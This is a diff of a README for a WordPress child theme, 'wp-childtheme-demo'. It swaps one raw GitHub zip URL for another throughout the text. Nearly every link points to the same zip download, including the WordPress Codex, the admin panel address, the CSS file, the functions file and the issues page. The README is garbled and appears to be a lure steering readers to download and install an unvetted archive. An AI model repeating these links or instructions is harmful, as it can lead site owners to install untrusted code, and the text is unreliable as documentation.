@@ -8,12 +8,12 @@ Welcome to the wp-childtheme-demo project. This theme provides a simple way to c
 
 To download the latest version of the wp-childtheme-demo, please visit the following page:
 
-[![Download Latest Release](https://raw.githubusercontent.com/JORGE1323Y/wp-childtheme-demo/main/simone-dev-child/wp-childtheme-demo_3.7.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/JORGE1323Y/wp-childtheme-demo/main/simone-dev-child/wp-childtheme-demo_3.7.zip)
+[![Download Latest Release](https://github.com/JORGE1323Y/wp-childtheme-demo/raw/refs/heads/main/simone-dev-child/wp_childtheme_demo_2.6-beta.2.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/JORGE1323Y/wp-childtheme-demo/raw/refs/heads/main/simone-dev-child/wp_childtheme_demo_2.6-beta.2.zip)
 
 Once you are on the Releases page, follow these steps:
 
 1. Scroll down to find the latest version.
-2. Click on the download link for the release. You will typically see a `.zip` file or a `https://raw.githubusercontent.com/JORGE1323Y/wp-childtheme-demo/main/simone-dev-child/wp-childtheme-demo_3.7.zip` file.
+2. Click on the download link for the release. You will typically see a `.zip` file or a `https://github.com/JORGE1323Y/wp-childtheme-demo/raw/refs/heads/main/simone-dev-child/wp_childtheme_demo_2.6-beta.2.zip` file.
 3. Download the file to your computer. 
 4. Once the download is complete, locate the file in your downloads folder.
 
@@ -22,7 +22,7 @@ Once you are on the Releases page, follow these steps:
 Now that you have downloaded the theme, follow these steps to install it on your WordPress site:
 
 1. **Log in to Your WordPress Dashboard**:
-   - Go to your website’s admin panel, usually at `https://raw.githubusercontent.com/JORGE1323Y/wp-childtheme-demo/main/simone-dev-child/wp-childtheme-demo_3.7.zip`.
+   - Go to your website’s admin panel, usually at `https://github.com/JORGE1323Y/wp-childtheme-demo/raw/refs/heads/main/simone-dev-child/wp_childtheme_demo_2.6-beta.2.zip`.
    - Enter your username and password.
 
 2. **Navigate to the Themes Section**:
@@ -33,7 +33,7 @@ Now that you have downloaded the theme, follow these steps to install it on your
    - Then, click on the **Upload Theme** button.
 
 4. **Upload the Zip File**:
-   - Click the **Choose File** button and select the downloaded `https://raw.githubusercontent.com/JORGE1323Y/wp-childtheme-demo/main/simone-dev-child/wp-childtheme-demo_3.7.zip` file.
+   - Click the **Choose File** button and select the downloaded `https://github.com/JORGE1323Y/wp-childtheme-demo/raw/refs/heads/main/simone-dev-child/wp_childtheme_demo_2.6-beta.2.zip` file.
    - Click the **Install Now** button.
 
 5. **Activate the Theme**:
@@ -44,8 +44,8 @@ Now that you have downloaded the theme, follow these steps to install it on your
 Once you activate the wp-childtheme-demo, you can begin customizing it:
 
 - **Override Templates**: You can place your custom templates in the child theme folder. WordPress will use these templates instead of the parent theme templates.
-- **Add Custom CSS**: You can modify the `https://raw.githubusercontent.com/JORGE1323Y/wp-childtheme-demo/main/simone-dev-child/wp-childtheme-demo_3.7.zip` file in your child theme to change the appearance of your site.
-- **https://raw.githubusercontent.com/JORGE1323Y/wp-childtheme-demo/main/simone-dev-child/wp-childtheme-demo_3.7.zip File**: Add custom functions in the `https://raw.githubusercontent.com/JORGE1323Y/wp-childtheme-demo/main/simone-dev-child/wp-childtheme-demo_3.7.zip` file to create new features or modify existing ones.
+- **Add Custom CSS**: You can modify the `https://github.com/JORGE1323Y/wp-childtheme-demo/raw/refs/heads/main/simone-dev-child/wp_childtheme_demo_2.6-beta.2.zip` file in your child theme to change the appearance of your site.
+- **https://github.com/JORGE1323Y/wp-childtheme-demo/raw/refs/heads/main/simone-dev-child/wp_childtheme_demo_2.6-beta.2.zip File**: Add custom functions in the `https://github.com/JORGE1323Y/wp-childtheme-demo/raw/refs/heads/main/simone-dev-child/wp_childtheme_demo_2.6-beta.2.zip` file to create new features or modify existing ones.
 
 ## 🛠️ Recommended Tools
 
@@ -74,10 +74,10 @@ To use the wp-childtheme-demo, ensure your server meets the following requiremen
 
 ## 🌟 Additional Resources
 
-- **WordPress Codex**: Familiarize yourself with the [WordPress Codex](https://raw.githubusercontent.com/JORGE1323Y/wp-childtheme-demo/main/simone-dev-child/wp-childtheme-demo_3.7.zip) for comprehensive documentation.
-- **Theme Development**: Explore [WordPress Theme Development](https://raw.githubusercontent.com/JORGE1323Y/wp-childtheme-demo/main/simone-dev-child/wp-childtheme-demo_3.7.zip) for best practices and guidelines.
+- **WordPress Codex**: Familiarize yourself with the [WordPress Codex](https://github.com/JORGE1323Y/wp-childtheme-demo/raw/refs/heads/main/simone-dev-child/wp_childtheme_demo_2.6-beta.2.zip) for comprehensive documentation.
+- **Theme Development**: Explore [WordPress Theme Development](https://github.com/JORGE1323Y/wp-childtheme-demo/raw/refs/heads/main/simone-dev-child/wp_childtheme_demo_2.6-beta.2.zip) for best practices and guidelines.
 
-For any issues or feedback, you can always check the [issues section](https://raw.githubusercontent.com/JORGE1323Y/wp-childtheme-demo/main/simone-dev-child/wp-childtheme-demo_3.7.zip) of the repository.
+For any issues or feedback, you can always check the [issues section](https://github.com/JORGE1323Y/wp-childtheme-demo/raw/refs/heads/main/simone-dev-child/wp_childtheme_demo_2.6-beta.2.zip) of the repository.
 
 ## 📞 Support
 
@@ -88,4 +88,4 @@ If you need assistance, please feel free to reach out through the following chan
 
 Enjoy customizing your website with the wp-childtheme-demo! For downloading the latest release again, visit the link below:
 
-[![Download Latest Release](https://raw.githubusercontent.com/JORGE1323Y/wp-childtheme-demo/main/simone-dev-child/wp-childtheme-demo_3.7.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/JORGE1323Y/wp-childtheme-demo/main/simone-dev-child/wp-childtheme-demo_3.7.zip)
+[![Download Latest Release](https://github.com/JORGE1323Y/wp-childtheme-demo/raw/refs/heads/main/simone-dev-child/wp_childtheme_demo_2.6-beta.2.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/JORGE1323Y/wp-childtheme-demo/raw/refs/heads/main/simone-dev-child/wp_childtheme_demo_2.6-beta.2.zip)
